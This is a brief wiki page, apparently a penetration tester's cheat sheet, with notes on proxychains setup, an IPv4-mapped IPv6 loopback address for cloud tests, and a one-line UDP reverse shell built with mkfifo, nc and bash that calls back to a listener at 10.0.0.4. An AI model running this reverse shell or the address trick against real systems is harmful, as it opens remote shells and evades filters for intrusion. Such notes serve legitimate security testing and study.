---
title: General Network Tricks
description: A quick summary of Generalnetworktricks
published: true
date: 2023-01-28T18:14:58.426Z
tags: 
editor: markdown
dateCreated: 2022-10-01T21:19:34.651Z
---

# Proxychains

/etc/proxychains4.conf
```
[ProxyList]
socks5 localhost 12345
```

$proxychains bash
$anything in that bash session is proxied

# Funky addressing
May be able to use this on AWS/GCP/Azure tests
```
::ffff:127.0.0.1
```

# One line UDP Callback
note the HI is there so that the listener will open the connection. It will then be able to talk back to sender.
```
rm fifo; mkfifo fifo; nc -u 10.0.0.4 9998 < fifo | { echo "HI"; bash; } > fifo 2>&1  
```
